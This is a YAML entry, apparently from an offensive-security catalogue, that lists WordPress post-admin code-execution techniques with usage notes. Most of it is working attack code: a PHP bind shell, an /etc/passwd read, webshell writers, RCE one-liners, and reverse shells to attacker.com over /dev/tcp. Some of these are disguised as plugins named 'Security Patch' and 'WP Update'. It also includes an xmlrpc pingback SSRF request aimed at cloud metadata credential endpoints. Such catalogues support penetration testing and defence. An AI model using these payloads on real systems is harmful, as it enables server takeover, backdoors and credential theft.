---
comment: |
  WordPress provides multiple code execution vectors to users with administrative access.
  The most direct paths are the built-in theme/plugin PHP file editors (Appearance > Theme
  File Editor, Plugins > Plugin File Editor) and the ability to install arbitrary plugins or themes.
  These features are enabled by default; `DISALLOW_FILE_EDIT` and `DISALLOW_FILE_MODS` constants
  disable them when set in `wp-config.php`.
functions:
  bind-shell:
  - code: |
      <?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",12345);socket_listen($s,1);$c=socket_accept($s);$p=proc_open("/bin/sh",array(0=>$c,1=>$c,2=>$c),$x); ?>
    comment: |
      Inject into an active theme file via the Theme File Editor. The page hangs while the
      bind shell awaits a connection on TCP port 12345. Requires the PHP sockets extension
      (enabled by default on most LAMP stacks). Connect with: nc victim.com 12345
    connector: tcp-client
    contexts:
      admin:
    tty: false
  file-read:
  - code: |
      <?php echo file_get_contents('/etc/passwd'); ?>
    comment: |
      Read an arbitrary server-side file by injecting into a theme file. The output is rendered
      in the HTTP response body when any page is requested.
    contexts:
      admin:
  file-write:
  - code: |
      <?php file_put_contents(ABSPATH . 'wp-content/uploads/shell.php', '<?php system($_GET["c"]); ?>'); ?>
    comment: |
      Write a PHP webshell to a publicly accessible directory. The uploads directory is always
      world-readable and writable by the web server process.
      Access the shell at: http://victim.com/wp-content/uploads/shell.php?c=id
    contexts:
      admin:
  rce:
  - code: |
      <?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
    comment: |
      Inject a PHP one-liner into an active theme file (e.g., `functions.php`) via the Theme
      File Editor at `/wp-admin/theme-editor.php`. Trigger by visiting any page on the site,
      then pass commands via the `cmd` GET parameter.
    contexts:
      admin:
  reverse-shell:
  - blind: true
    code: |
      <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &"); ?>
    comment: "Edit an active theme file (e.g., `404.php` under Appearance > Theme\
      \ File Editor) and\ninsert this payload. Trigger by navigating to a non-existent\
      \ page on the site to load\nthe 404 template. The shell runs asynchronously\
      \ via the trailing `&` \u2014 the HTTP response\nwill not confirm execution;\
      \ check the listener for the incoming connection.\n"
    contexts:
      admin:
    listener: tcp-server
    tty: false
  - blind: true
    code: |
      <?php
      /*
      Plugin Name: Security Patch
      */
      exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &");
      ?>
    comment: "A plugin containing this PHP file will be executed on every page load\
      \ once activated.\nPackage the file in a ZIP as `malicious/malicious.php` and\
      \ upload via\nPlugins > Add New > Upload Plugin. The shell runs asynchronously\
      \ \u2014 check the listener.\n"
    contexts:
      admin:
      plugin:
    listener: tcp-server
    tty: false
  ssrf:
  - code: |
      curl -s -X POST "http://victim.com/xmlrpc.php" \
        -H "Content-Type: text/xml" \
        -d '<?xml version="1.0" encoding="UTF-8"?>
      <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
          <param><value><string>http://169.254.169.254/latest/meta-data/iam/security-credentials/</string></value></param>
          <param><value><string>http://victim.com/</string></value></param>
        </params>
      </methodCall>'
    comment: "WordPress XML-RPC exposes a `pingback.ping` method that makes an outbound\
      \ HTTP GET\nrequest to the first parameter URL on behalf of the server. The\
      \ second parameter must\nbe any valid WordPress page URL on the target site.\n\
      \nThe XML-RPC response reflects the HTTP status of the outbound request \u2014\
      \ a fault code\nof `0` or `17` indicates the target responded, revealing open\
      \ internal ports (semi-blind\nSSRF). Use to probe cloud metadata endpoints:\n\
      - AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n-\
      \ GCP: http://metadata.google.internal/computeMetadata/v1/\n- Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\
      \nXML-RPC is enabled by default. If disabled, the REST API with server-side\
      \ URL fetching\n(e.g., oEmbed endpoint: /wp-json/oembed/1.0/proxy?url=<target>)\
      \ may be an alternative.\n"
    contexts:
      unauthenticated:
  webshell:
  - code: |
      <?php
      /*
      Plugin Name: WP Update
      */
      $shell = plugin_dir_path(__FILE__) . 'shell.php';
      if (!file_exists($shell)) {
          file_put_contents($shell, '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>');
      }
      ?>
    comment: |
      A minimal plugin that exposes a persistent webshell at `/wp-content/plugins/wp-update/shell.php`.
      Package as `wp-update/wp-update.php` in a ZIP and install via Plugins > Add New > Upload Plugin.
      Access the shell at: http://victim.com/wp-content/plugins/wp-update/shell.php?c=id
    contexts:
      admin:
      plugin:
...
